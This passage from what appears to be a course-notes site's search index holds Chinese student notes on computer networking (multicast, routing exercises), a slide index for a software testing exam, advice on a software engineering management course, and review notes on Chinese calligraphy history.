<p>\u9700\u8981\u8ba9\u8def\u7531\u5668\u80fd\u591f\u638c\u63e1\u591a\u64ad\u7ec4\u7684\u6210\u5458\u4fe1\u606f\uff0cIGMP\u662f\u8ba9\u8fde\u5230\u672c\u5c40\u57df\u7f51\u7684\u591a\u64ad\u8def\u7531\u5668\uff0c\u77e5\u9053\u672c\u5c40\u57df\u7f51\u4e2d\u662f\u5426\u6709\u4e3b\u673a\u53c2\u52a0\u6216\u9000\u51fa\u4e86\u67d0\u4e2a\u591a\u64ad\u7ec4</p> <p>\u200b\u200b</p> <p>\u6784\u5efa\u591a\u64ad\u8f6c\u53d1\u6811\uff0c\u53ef\u4ee5\u907f\u514d\u73af\u8def</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#7-ip","title":"7. \u79fb\u52a8IP*","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#8","title":"8. \u7f51\u7edc\u5c42\u8bbe\u5907*","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#_3","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>\u8ba1\u7b97IP\u5206\u7247</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u9898\u7684\u7b54\u6848\u771f\u7684\u552f\u4e00\u5417</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6982\u5ff5\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6ce8\u610f\u4e3b\u673a\u53f7\u5168\u4e3a1\u4e0d\u80fd\u7528</li> </ul> <p>\u200b\u200b</p> <ul> <li> <p>\u8bb0\u5fc6\u9898</p> </li> <li> <p>QJS Quiz5\u7684\u5927\u9898</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5185\u90e8\u7f51\u5173\u534f\u8bae \u5916\u90e8\u7f51\u5173\u534f\u8bae \u9759\u6001\u8def\u7531\u7b97\u6cd5 \u94fe\u8def\u72b6\u6001\u8def\u7531\u7b97\u6cd5</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u8def\u7531\u7b97\u6cd5\u548c\u8def\u7531\u534f\u8bae\u7684\u57fa\u672c\u884c\u4e3a</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u4f20\u5947\u7ffb\u8bd1\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8bb0\u5fc6\u6982\u5ff5</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8def\u7531\u805a\u5408 \u738b\u9053\u539f\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>SDN \u5357\u5411 \u662f\u6307\u4e0b\u53d1\u8def\u7531\u8868\u7684\u63a5\u53e3 \u5317\u5411 \u662f\u6307\u7f16\u7a0b\u63a5\u53e3</li> </ul> <p>\u200b\u200b</p> <ul> <li>A</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u53ea\u77e5\u9053\u5982\u4f55\u8def\u7531\u5230\u5176\u4ed6\u533a\u57df</li> </ul> <p>\u200b\u200b</p> <ul> <li>B\u200b</li> </ul> <p>\u200d</p> <p>\u200b</p> <ul> <li>DA</li> </ul> <p>\u200b\u200b</p> <ul> <li>D</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81%E4%B8%8E%E6%B5%8B%E8%AF%95/PPT%20%E7%B4%A2%E5%BC%95/","title":"\u8f6f\u4ef6\u8d28\u91cf\u4fdd\u8bc1\u548c\u6d4b\u8bd5","text":"<p>\u8f6f\u6d4bPPT\u7d22\u5f15</p> <p>\u5927\u4e09\u4e0a\u5b66\u7684\u6700\u4e0d\u660e\u6240\u4ee5\u7684\u8bfe\u7a0b\uff0c\u867d\u7136\u8001\u5e08\u6700\u540e\u7ed9\u5206\u8fd8\u4e0d\u9519\uff0c\u4f46\u662f\u4e0a\u8bfe\u7684\u98ce\u683c\u4ee5\u53ca\u6a21\u7cca\u4e0d\u6e05\u7684\u4f5c\u4e1a\u8981\u6c42\u7740\u5b9e\u8ba9\u6211\u4e0d\u6562\u606d\u7ef4\u3002\u5206\u6570\u6784\u6210\u662f\u4e00\u4e2a\u4f5c\u4e1a\u52a0\u4e0a\u671f\u672b\u8003\u8bd5\uff0c\u671f\u672b\u8003\u8bd5\u662f\u5f00\u5377\uff0c\u56e0\u6b64\u6211\u5c06PPT\u7684\u7d22\u5f15\u653e\u5728\u8fd9\u5730\u65b9\uff0c\u76f8\u5e94\u7684PPT\u5728\u8fd9\u91cc\uff0c\u6839\u636e\u672c\u4eba\u7684\u7ecf\u9a8c\uff0c\u9996\u5148\u671f\u672b\u6bcf\u5e74\u7684\u8303\u56f4\u4e0d\u540c\uff0c\u8fd9\u4e2a\u7d22\u5f15\u53ef\u4ee5\u5b8c\u5168\u8986\u76d6\u6211\u4eec\u90a3\u6b21\u7684\u671f\u672b\u8003\u8bd5\uff0c\u4f46\u662f\u672a\u5fc5\u4e00\u76f4\u597d\u7528\uff0c\u800c\u4e14\u671f\u672b\u7684\u8003\u8bd5\u65f6\u95f4\u975e\u5e38\u7d27\u5f20\uff0c\u5f88\u6709\u53ef\u80fd\u6284\u4e0d\u5b8c\uff0c\u5373\u4f7f\u6211\u4eec\u627e\u7684\u5f88\u5feb\uff0c\u5927\u5bb6\u8bb0\u5f97\u628a\u63e1\u65f6\u95f4\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u671f\u672b\u53ef\u80fd\u6279\u7684\u975e\u5e38\u5bbd\u3002\u6211\u4eec\u5c0f\u7ec4\u548c\u4e00\u4e9b\u5176\u4ed6\u7684\u5c0f\u7ec4\uff0c\u7ec4\u5185\u62ff\u5230\u7684\u5206\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u4f3c\u4e4e\u5c0f\u7ec4\u4f5c\u4e1a\u624d\u662f\u62c9\u5f00\u5dee\u8ddd\u7684\u5173\u952e\u3002</p> <ul> <li>4 \u8d28\u91cf\u7684\u5b9a\u4e49 Quality</li> <li>5-7 McCall's Quality Model</li> <li>8 \u4ec0\u4e48\u5730\u65b9\u5f15\u5165\u4e86\u7f3a\u9677 50%requirement 30%Design 20%Implement/code</li> <li>9 \u4e0d\u540c\u9636\u6bb5\u4fee\u6b63\u7f3a\u9677\u7684\u5f00\u9500 cost</li> <li>10-12 QA \u548c QC \u7684\u533a\u522b \uff08QA \u548c Test\uff09</li> <li> <p>13-38 \u6d4b\u8bd5\u7684\u5206\u7c7b \u540e\u9762\u51e0\u9875\u90fd\u662f \u53cd\u6b63\u53ea\u8981\u6709\u4e0d\u8ba4\u8bc6\u7684\u6d4b\u8bd5\u540d\u79f0\u90fd\u6765\u8fd9\u8fb9\u770b\u770b</p> </li> <li> <p>289 \u4e5f\u6709\u5206\u7c7b</p> </li> <li>14 - 17 \u767d\u76d2\u6d4b\u8bd5 \u9ed1\u76d2\u6d4b\u8bd5 \u7070\u76d2\u6d4b\u8bd5</li> <li>19 - 21 UAT\uff08User Acceptance Testing\uff09 \u548c System Testing</li> <li>23 V Model</li> <li>24-27 Test \u548c McCall's Quality Model \u7684\u5173\u7cfb</li> <li>28-30 \u56de\u5f52\u6d4b\u8bd5\u548c\u5192\u70df\u6d4b\u8bd5 Regression \u548c Smoke</li> <li>31-35 a\u6d4b\u8bd5 \u548c b\u6d4b\u8bd5</li> <li>37-38 Static test \u548c Dynamic test</li> <li>41 \u7011\u5e03\u6a21\u578b</li> <li>44 V model</li> <li>45-46 \u7edf\u4e00\u8fc7\u7a0b</li> <li>47-54 \u654f\u6377 \u654f\u6377\u5f00\u53d1\u7684\u6700\u4f73\u5b9e\u8df5\uff08Scrum\uff0c XP\uff0cCI\uff0cTDD\uff09</li> <li> <p>55 Scrum</p> </li> <li> <p>306 Scrum \u4e2d QA\u7684\u5de5\u4f5c</p> </li> <li>56 XP \u548c TDD</li> <li>57 \u6d41\u7a0b</li> <li>\u540e\u9762\u662f\u4ea7\u51fa\u7269\u7684\u903b\u8f91</li> <li>58-61 Traceability</li> <li>62-65 Coverage</li> <li>\u540e\u9762\u662f\u6d4b\u8bd5\u8ba1\u5212\u7684\u5185\u5bb9</li> <li>67-70 test plan \u7684\u5b9a\u4e49 \u8bbe\u5b9a\u8303\u56f4\uff08Scope\uff09\u8bbe\u5b9a\u8def\u5f84\uff08Schedule\uff09\u7ec4\u7ec7\u8d44\u6e90\uff08Resource\uff09</li> <li>71-82 Scope \u8bbe\u5b9a\u8303\u56f4 iteration</li> <li>83-88 Schedule \u8bbe\u5b9a\u8def\u5f84 \u9700\u6c42\u5206\u6790 \u9700\u6c42\u9636\u6bb5QA\u7684\u6838\u5fc3\u5de5\u4f5c</li> <li>89-97 Resource \u7ec4\u7ec7\u8d44\u6e90 \u5168\u529f\u80fd\u63d0\u4ea4\u56e2\u961f \u548c \u6b63\u5e38\u5411\u63d0\u4ea4\u56e2\u961f SDP\u5468\u671f\u7684\u91cc\u7a0b\u7891</li> <li>\u540e\u9762\u662f\u8d28\u91cf\u6c34\u5e73\u548c\u8f6f\u4ef6\u5ea6\u91cf</li> <li>99-102 EC \u548c AC \u51c6\u51fa\u6807\u51c6\u548c\u51c6\u5165\u6807\u51c6 Exit Criteria \u548c Admission criteria</li> <li>103-110 \u8f6f\u4ef6\u5ea6\u91cf\u4f53\u7cfb \u548c \u8f6f\u4ef6\u5ea6\u91cf\u6307\u6807 Software quality factor\uff08LOC FP ROI NPS\uff09</li> <li>111-113 \u5708\u590d\u6742\u5ea6 Cyclomatic Complexity</li> <li>116-119 \u745e\u5229\u5206\u5e03 Rayleigh distribution \u7f3a\u9677\u53d1\u73b0 the daily number of newly discovered defects</li> <li>\u540e\u9762\u662f\u6d4b\u8bd5\u7528\u4f8b\u8bbe\u8ba1</li> <li>123 Test life cycle</li> <li>125 Test Case Design Workflow</li> <li>127 Test Case Concept   test case \u7684\u5b9a\u4e49</li> <li>130 Test Case Design Objective</li> <li>137 Test Case Design Method \u8bbe\u8ba1test Case\u7684\u65b9\u6cd5</li> <li>142 ECP(\u7b49\u4ef7\u7c7b\u5212\u5206) \u548c BVA(\u8fb9\u754c\u503c\u6d4b\u8bd5)</li> <li>143-158 \u7b49\u4ef7\u7c7b\u5212\u5206</li> <li>159-175 \u8fb9\u754c\u503c\u6d4b\u8bd5</li> <li>167 \u6bd4\u8f83\u4e86\u7b49\u4ef7\u7c7b\u5212\u5206\u548c\u8fb9\u754c\u503c\u6d4b\u8bd5</li> <li>176-193 Combinatorial Analysis(Pairwise)</li> <li>\u540e\u9762\u662f\u6d4b\u8bd5\u63d0\u4ea4</li> <li>197-201 \u6d4b\u8bd5\u63d0\u4ea4\u7684\u5185\u5bb9Scrum\u7684\u63d0\u4ea4 PSPI</li> <li>202-203 \u6d4b\u8bd5\u63d0\u4ea4\u6240\u5904\u7684\u4f4d\u7f6e \u548c Key Characteristics of a Potentially Shippable Product Increment</li> <li>205 \u6d4b\u8bd5\u62a5\u544a</li> <li>207 \u62a5\u544a\u7684\u8981\u7d20</li> <li>213-218 \u63cf\u8ff0\u91cd\u8981\u7684\u8f6f\u4ef6\u8d28\u91cf\u95ee\u9898</li> <li>221-227 Burn Down Chart</li> <li>\u540e\u9762\u662fUnit Test\u7684\u5185\u5bb9</li> <li>235-242 Unit test\u7684\u91cd\u8981\u6027\uff08\u5c3d\u65e9\u5f00\u5c55\u6d4b\u8bd5\uff0c\u900f\u660e\u5ea6\uff0c\u81ea\u52a8\u5316\uff09</li> <li>239 \u4e3a\u4ec0\u4e48\u8981\u5c3d\u65e9\u5f00\u59cb\u6d4b\u8bd5Bring the test as early as possible</li> <li>240 Make the white box test possible</li> <li>241 Lower the threshold of test as possible</li> <li>242 Make the integration as specific as possible</li> <li>244 unit test \u7684\u5b9a\u4e49</li> <li>246 Who perform the unit test and when we do it 247</li> <li>249-252 \u4e0d\u540c\u573a\u666f\u4e2d\u7684unit test\uff08General Development, TDD, XP\uff09\u8c01\u6765\u6267\u884cunit test\uff08\u8003\u573a\u4e0a\u9047\u5230\u6284\u8fd9\u90e8\u5206\uff09</li> <li>Detail design \u662f unit test case</li> <li>\u200b\u200b</li> <li>248 \u91cc\u7684\u56fe\u662fTDD\u7684</li> <li>253-256 How to perform the unit test / best practice \u63d0\u5230\u4e86 mock</li> <li>247-258 Unit Test \u548c White box test \u7684\u533a\u522b \uff08\u4f1a\u8003\u7684\uff09</li> <li>\u4e09\u79cd\u8986\u76d6\u662f\u767d\u76d2\u6d4b\u8bd5\u7684\u65b9\u6cd5</li> <li>\u540e\u9762\u662f\u4e09\u79cd\u8986\u76d6</li> <li>\u540e\u9762\u662f\u5f80\u5c4aPPT\u7684\u5185\u5bb9</li> <li>282-283 Testing \u548c Debugging \u7684\u533a\u522b</li> <li>284 \u4e09\u79cd\u8986\u76d6\u7684Venn\u56fe</li> <li>298 V model \u4f18\u7f3a\u70b9\uff0c\u548c\u4e00\u4e9b\u5176\u4ed6\u7684\u5185\u5bb9 Document</li> <li>311 Bug LifeCycle</li> <li>313 test \u548c debug</li> <li>\u770b\u6d4b\u8bd5\u6267\u884c\uff0c\u5982\u4f55\u62a5\u544a\u95ee\u9898\u7b49\u7b49\uff0c\u53ef\u4ee5\u770b\u6700\u540e\u7684\u6d4b\u8bd5\u6267\u884c\u90e8\u5206</li> <li>346 \u4f18\u5148\u7ea7\u548c\u4e25\u91cd\u6027</li> <li>332 \u51c6\u5165\u51c6\u51fa\u6807\u51c6</li> </ul> <p>\u4e0d\u5728PPT\u4e0a\u7684\u90e8\u5206</p> <ul> <li>V model\u8fde\u63a5\u4e86Test\u548c\u5176\u4ed6\u90e8\u5206</li> </ul> <p>\u200b\u200b</p> <p>\u4e0d\u786e\u5b9a\u7684\u5185\u5bb9</p> <p>\u200b\u200b</p> <ul> <li>What factors determine the priority of a bug.   QA\u786e\u5b9a\u7684</li> <li>configuration management \u548c version control\u533a\u522b</li> <li>\u62a5\u544abug\u65f6\uff0c\u63cf\u8ff0bug fix\u591a\u7d27\u6025\uff0c\u591a\u4e48\u96be\u7684\u4e24\u4e2aitem</li> <li>V model, waterfall \u7684 unit test \u5bf9\u5e94\u54ea\u4e2a stage\uff0c\u8fd9\u4e2a stage \u7684 inputs \u548c outputs</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E8%BD%AF%E5%B7%A5%E7%AE%A1/%E8%BD%AF%E5%B7%A5%E7%AE%A1/","title":"\u8f6f\u4ef6\u5de5\u7a0b\u7ba1\u7406","text":"<p>\u8f6f\u4ef6\u5de5\u7a0b\u7ba1\u7406\u7ecf\u9a8c\u5206\u4eab</p> <p>\u5bf9\u4e8e\u8fd9\u95e8\u8bfe\u6211\u7684\u7ecf\u9a8c\u53ea\u6709\u4e00\u6761\uff1a\u5f53\u52a9\u6559\u3002\u9996\u5148\u8fd9\u95e8\u8bfe\u662f\u968f\u673a\u7ec4\u961f\uff0c\u7ec4\u5230\u4ec0\u4e48\u6837\u7684\u961f\u53cb\u5168\u51ed\u8fd0\u6c14\uff0c\u4f46\u662f\u5176\u5b9e\u6700\u540e\u4e5f\u6ca1\u6709\u4e25\u683c\u7684\u9a8c\u6536\u73af\u8282\uff0c\u56e0\u6b64\u5176\u5b9e\u6210\u54c1\u662f\u53ef\u4ee5\u7cca\u5f04\u7684\uff0c\u4f46\u662f\u8fd9\u95e8\u8bfe\u52a9\u6559\u56e2\u7684\u6743\u5229\u5927\u7684\u4ee4\u4eba\u53d1\u6307\uff0c\u52a9\u6559\u56e2\u89c4\u5b9a\u4e86\u52a9\u6559\u56e2\u81ea\u8eab\u548c\u5404\u7ec4\u7ec4\u957f\u7684\u52a0\u5206\uff0c\u5176\u5b9e\u5728\u5927\u5bb6\u968f\u610f\u7684\u4e92\u8bc4\u548c\u8001\u5e08\u7684\u6253\u5206\u4e0b\uff0c\u5927\u5bb6\u6700\u540e\u6536\u5230\u7684\u5206\u6570\u90fd\u5dee\u4e0d\u591a\uff0c\u800c\u8fd9\u4e2a\u52a0\u5206\u5c31\u6784\u6210\u4e86\u8fd9\u95e8\u8bfe\u62c9\u5f00\u5dee\u8ddd\u7684\u5173\u952e\uff0c\u56e0\u6b64\u5927\u5bb6\u6700\u597d\u5728\u7b2c\u4e00\u8282\u8bfe\u53bb\u7ade\u9009\u52a9\u6559\u5de5\u4f5c\uff0c\u6211\u4eec\u8fd9\u5c4a\u7684\u52a9\u6559\u56e2\u67098\u4e2a\u540d\u989d\uff0c\u636e\u8bf4\u5df2\u7ecf\u662f\u56e0\u4e3a\u5927\u5bb6\u8fc7\u4e8e\u70ed\u60c5\u6269\u62db\u4e86\uff0c\u5b9e\u9645\u6211\u4eec\u611f\u89c9\u62a5\u540d\u4e86\u5feb20\u4e2a\u4eba\uff08\u5927\u5bb6\u4e5f\u662f\u8d8a\u6765\u8d8a\u5377\u4e86\uff09\uff0c\u5728\u7ade\u9009\u52a9\u6559\u56e2\u4e4b\u540e\uff0c\u8001\u5e08\u4f1a\u5b89\u6392\u4e00\u6b21\u5bf9\u8bdd\u548c\u4f60\u9762\u8bd5\uff0c\u53ef\u80fd\u9700\u8981\u4f60\u505a\u4e00\u4e9b\u76f8\u5173\u51c6\u5907\uff0c\u4f46\u662f\u6211\u5f53\u65f6\u4e5f\u6ca1\u505a\u4ec0\u4e48\u51c6\u5907\u5c31\u4e0a\u4e86\uff0c\u4e5f\u8c08\u4e0d\u4e0a\u6709\u7ecf\u9a8c\uff0c\u8001\u5e08\u4f1a\u8be2\u95ee\u4f60\u5173\u4e8e\u5f53\u52a9\u6559\u7684\u52a8\u673a\u4ee5\u53ca\u4f60\u81ea\u8eab\u7684\u4f18\u52bf\u4e4b\u7c7b\u7684\uff0c\u53ef\u4ee5\u9002\u5f53\u51c6\u5907\u4e00\u4e0b\u3002\u6700\u540e\u8fd8\u662f\u8981\u63d0\u9192\u4e00\u4e0b\u8fd9\u95e8\u8bfe\u662f\u6709\u968f\u673a\u70b9\u540d\u7684\uff0c\u5e76\u4e14\u662f\u6700\u6734\u7d20\u7684\u62a5\u540d\u5b57\u5f0f\u7684\u70b9\u540d\uff0c\u6700\u597d\u8fd8\u662f\u8981\u5230\u573a\u3002</p>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/","title":"\u4e2d\u56fd\u4e66\u6cd5\u53f2","text":"<p>\u4e2d\u56fd\u4e66\u6cd5\u53f2</p> <p>\u662f\u7f8e\u80b2\u8bfe\u7a0b\uff0c\u8001\u5e08\u5f88\u6709\u6c34\u5e73\uff0c\u8bb2\u8bfe\u4e5f\u7b97\u6709\u8da3\uff0c\u4e8b\u60c5\u4e0d\u591a\uff0c\u5b66\u671f\u4e2d\u95f4\u5c31\u4e00\u7bc7\u7c7b\u4f3c\u89c2\u540e\u611f\u7684\u8bba\u6587\uff0c800\u5b57\u4ee5\u5185\u597d\u8bc4\u3002\u671f\u672b\u8003\u8bd5\u95ed\u5377\uff0c\u4f46\u662f\u52a9\u6559\u6700\u540e\u4e00\u8282\u8bfe\u4f1a\u753b\u91cd\u70b9\uff0c\u57fa\u672c\u4e0e\u671f\u672b\u8003\u8bd5\u6b63\u4ea4\uff0c\u5e76\u4e14\u6709PPT\u548c\u5f55\u64ad\uff0c\u53ea\u8981\u82b1\u4e00\u70b9\u65f6\u95f4\u590d\u4e60\uff0c\u6700\u540e\u5f97\u5206\u4e0d\u4f1a\u5dee\uff0c\u5982\u679c\u8bfe\u90fd\u80fd\u8ba4\u771f\u542c\u5e94\u8be5\u53ef\u4ee5\u83b7\u5f97\u5f88\u9ad8\u7684\u5206\u6570\u3002</p>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_2","title":"\u4e66\u6cd5\u53f2\u671f\u672b\u590d\u4e60","text":"<p>\u8003\u8bd5\u5185\u5bb9</p> <ul> <li>\u9898\u578b\u5206\u5e03\u89c1PPT</li> <li>\u4e0a\u8bfe\u8bb2\u7684\u4e1c\u897f+\u8bfe\u672c\u90e8\u5206\u7ae0\u8282</li> <li>*\u662f\u76f8\u5bf9\u4e0d\u662f\u5f88\u91cd\u8981\u7684\u4e1c\u897f</li> </ul> <p>\u200b\u200b</p> <p>\u5f88\u53ef\u80fd\u4f1a\u51fa\u90a3\u79cd\u662f\u5426\u6240\u6709\u51fa\u571f\u6587\u7269\u90fd\u7b97\u4f5c\u4e66\u6cd5\u4f5c\u54c1\u7684\u9898\u76ee</p> <ul> <li>\u4e66\u6cd5\u7684\u754c\u9650</li> </ul> <p>\u4e66\u753b\u540c\u6e90</p> <ul> <li>\u4e66\u6cd5\u7684\u7528\u7b14\u6765\u4f5c\u753b</li> <li>\u5510\u4ee5\u540e\u6587\u4eba\u7ed8\u753b\u7684\u5174\u8d77</li> <li>\u5bf9\u4e8e\u77f3\u5934\u6728\u7b49\u81ea\u7136\u7269\u8d28\u7684\u62bd\u8c61\u7406\u89e3</li> </ul> <p>\u4ec0\u4e48\u662f\u7ecf\u5178\uff0c\u7ecf\u5178\u7684\u5f62\u6210</p> <ul> <li>\u9700\u8981\u7ecf\u8fc7\u65f6\u95f4\u7684\u8003\u9a8c</li> <li>\u9b4f\u664b\u5357\u5317\u671d\u5230\u968b\u5510</li> <li>\u200d</li> </ul> <p>\u6700\u4f18\u4ef7\u503c</p> <p>\u200b\u200b</p> <p>PPT\u4e0a\u7684\u4f5c\u54c1\u53ef\u80fd\u4f1a\u62ff\u51fa\u6765\u9760\u8bba\u8ff0\u9898*</p> <p>\u5b9e\u9645\u5185\u5bb9</p>"},{"location":"ZJU-course/%E9%80%9A%E8%AF%86%E8%AF%BE%E7%A8%8B/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E4%B9%A6%E6%B3%95%E5%8F%B2/#_3","title":"\u4e66\u6cd5\u827a\u672f\u7684\u6027\u8d28\u548c\u5a92\u4ecb","text":"<ul> <li> <p>\u4e66\u6cd5\u7684\u5b9a\u4e49</p> </li> <li> <p>\u4ee5\u6bdb\u7b14\u4e3a\u4e66\u5199\u5de5\u5177</p> </li> <li>\u4ee5\u6c49\u5b57\u4e3a\u9020\u578b\u7684\u5177\u8c61\u827a\u672f</li> <li>\u4e5f\u6709\u4e00\u5b9a\u7684\u62bd\u8c61\u6027\uff0c\u5728\u8282\u594f\u548c\u60c5\u611f\u8868\u8fbe\u4e0a\uff0c\u4e0e\u97f3\u4e50\u7b49\u827a\u672f\u6709\u5171\u901a\u6027</li> <li> <p>\u7528\u7b14\u7684\u5b9a\u4e49\uff08\u4e66\u6cd5\u6700\u57fa\u672c\uff09\uff1a\u6267\u7b14\u548c\u8fd0\u7b14\u7684\u65b9\u6cd5\u3002</p> </li> <li> <p>\u5510\u4ee3\u4ee5\u524d\uff0c\u5f80\u5f80\u4e94\u6307\u6709\u5404\u81ea\u5206\u5de5\uff0c\u5510\u4ee3\u7684\u201c\u62e8\u956b\u6cd5\u201d\u3001\u201c\u6c38\u5b57\u516b\u6cd5\u201d\u90fd\u6307\u5411\u4e00\u79cd\u7cbe\u5de7\u800c\u7f1c\u5bc6\u7684\u8fd0\u7528\u6307\u3001\u638c\u7684\u65b9\u6cd5</p> </li> <li>\u540e\u4ee3\uff0c\u8fd0\u8155\uff0c\u8fd0\u81c2\u751a\u81f3\u5168\u8eab\u529b\u9053\uff0c\u4e5f\u79f0\u4e3a\u4eba\u4eec\u7528\u7b14\u7684\u65b9\u6cd5</li> <li> <p>\u7ed3\u6784\u7684\u5b9a\u4e49 \u5355\u4e2a\u5b57\u7684\u95f4\u67b6\u7ed3\u5b57\u3002\u4e5f\u79f0\u201c\u7ed3\u4f53\u201d\u3001\u201c\u7ed3\u5b57\u201d\u3001\u201c\u7ed3\u6784\u201d\u3001\u201c\u95f4\u67b6\u201d</p> </li> <li> <p>\u7ed3\u5b57\u4e0d\u4ec5\u662f\u4e00\u79cd\u9759\u6001\u7684\u5e73\u8861\uff0c\u4e5f\u662f\u7528\u7b14\u8fd0\u52a8\u7684\u7ed3\u679c</p> </li> <li>\u7b14\u753b\u4e4b\u95f4\uff0c\u7ed3\u6784\u5355\u5143\u4e4b\u95f4\u7684\u642d\u914d\u5173\u7cfb\u548c\u7ec4\u7ec7\u5f62\u5f0f</li> <li>\u7167\u5e94\uff0c\u987e\u76fc\uff0c\u63d6\u8ba9\uff0c\u5305\u88f9\u90fd\u662f\u5bf9\u70b9\u753b\u5173\u7cfb\u7684\u63cf\u8ff0</li> <li>\u70b9\u753b\u6784\u6210\u7ed3\u6784\uff0c\u7ed3\u6784\u968f\u7740\u7528\u7b14\u7684\u53d8\u5316\u4e5f\u5145\u6ee1\u53d8\u52a8</li> <li> <p>\u7ae0\u6cd5\u7684\u5b9a\u4e49 </p> </li> <li> <p>\u5b8c\u6574\u7684\u4e66\u6cd5\u7684\u7bc7\u7ae0\u5e03\u5c40\uff0c\u5305\u62ec\u5404\u79cd\u8d77\u627f\u8f6c\u5408\uff0c\u662f\u4eba\u4eec\u6b23\u8d4f\u4e66\u6cd5\u4f5c\u54c1\u7684\u7b2c\u4e00\u5370\u8c61\uff0c\u4e5f\u662f\u7528\u7b14\u987a\u5e8f\u5c55\u5f00\u7684\u81ea\u7136\u7ed3\u679c\u3002</p> </li> <li>\u7528\u7b14-&gt;\u7ed3\u6784-&gt;\u7ae0\u6cd5</li> <li> <p>\u4e34\u6479 \u5bf9\u53e4\u4ee3\u4e66\u6cd5\u8303\u672c\u7684\u53d6\u6cd5\u548c\u501f\u9274</p> </li> <li> <p>\u4e66\u6cd5\u7684\u5b66\u4e60\u53ea\u6709\u5e08\u53e4\u4eba\uff0c\u5e08\u9020\u5316\u662f\u53ea\u6709\u7ed8\u753b\u624d\u6709\uff0c\u5e08\u53e4\u4eba\u5c31\u662f\u6240\u8c13\u7684\u4e34\u6479</p> </li> <li>\u4e34\u6479\u53c8\u6709\u5b9e\u4e34\uff08\u7cbe\u51c6\uff09\u548c\u610f\u4e34\uff08\u6839\u636e\u6587\u672c\u5185\u5bb9\u548c\u4e2a\u4eba\u504f\u597d\u6765\u521b\u9020\u6027\u4e34\u6479\uff09</li> <li> <p>\u521b\u4f5c \u662f\u57fa\u4e8e\u4e34\u6479\uff0c\u901a\u8fc7\u4e34\u6479\u53e4\u4eba\u7684\u65b9\u5f0f\uff0c\u8fd0\u7528\u7279\u5b9a\u7684\u4e66\u6cd5\u98ce\u683c\u6216\u6587\u672c\u5185\u5bb9\u6765\u8fdb\u884c\u4e66\u5199\u521b\u4f5c\u3002</p> </li> <li> <p>\u4e2d\u56fd\u4e66\u6cd5\u7684\u521b\u4f5c\u51e0\u4e4e\u90fd\u9700\u8981\u4f9d\u6258\u4e8e\u524d\u4eba\u6240\u201c\u9884\u8bbe\u201d\u7684\u6a21\u5f0f</p> </li> <li>\u4e66\u753b\u540c\u6e90* -&gt; \u8d75\u5b5f\u982b -&gt; \u7528\u4e66\u6cd5\u7684\u7528\u7b14\u6765\u505a\u7ed8\u753b\uff0c\u4e2d\u56fd\u7ed8\u753b\u7684\u5199\u610f\u6027\u548c\u4e66\u6cd5\u5f88\u6709\u5173\u8054</li> <li> <p>\u4e66\u6cd5\u662f\u4e00\u79cd\u4ec0\u4e48\u6837\u7684\u827a\u672f\uff08\u4e66\u6cd5\u7684\u793e\u4f1a\u5730\u4f4d\uff09</p> </li> <li> <p>\u5728\u4e2d\u56fd\uff0c\u4e66\u6cd5\u7684\u793e\u4f1a\u5730\u4f4d\u9ad8\u4e8e\u7ed8\u753b</p> </li> <li>\u4e2d\u56fd\u4e66\u6cd5\u5728\u4e2d\u56fd\u793e\u4f1a\u751f\u6d3b\u4e2d\u6709\u5e7f\u6cdb\u7684\u8fd0\u7528\uff0c\u4e66\u6cd5\u4e0e\u5b9e\u7528\u8131\u4e0d\u5f00\u5e72\u7cfb\uff0c\u5305\u62ec\uff1a\u516c\u6587\uff0c\u8d26\u7c3f\uff0c\u7891\u78a3\uff0c\u4e66\u4fe1\u7b49\u7b49</li> <li>\u5230\u4e86\u660e\u6e05\u65f6\u671f\uff0c\u4e66\u6cd5\u5f62\u5236\u7684\u8fdb\u4e00\u6b65\u53d1\u5c55\u548c\u4e30\u5bcc\uff1a\u624b\u5377\uff0c\u5bf9\u8054\uff0c\u6247\uff0c\u533e\uff0c\u6761\u5e45\uff0c\u6761\u5c4f</li> <li> <p>\u4e2d\u56fd\u6587\u5b57\u53d1\u5c55\u51fa\u4e66\u6cd5\u827a\u672f\u7684\u6761\u4ef6</p> </li> <li> <p>\u6c49\u5b57\u5f62\u8c61\u662f\u4e66\u6cd5\u9020\u578b\u7684\u57fa\u7840</p> </li> <li>\u9525\u5f62\u7684\uff0c\u6709\u5f39\u6027\u7684\u6bdb\u7b14\u6709\u8868\u73b0\u529b</li> <li>\u9010\u6e10\u5f62\u6210\u4e86\u4e66\u5199\u6027\u7684\u70b9\u753b</li> <li>\u6587\u5b57\u5728\u4e2d\u56fd\u4eba\u65e5\u5e38\u751f\u6d3b\u4e2d\u7684\u91cd\u8981\u6027</li> <li>\u4e66\u5199\u7684\u65b9\u4fbf\u6027</li> 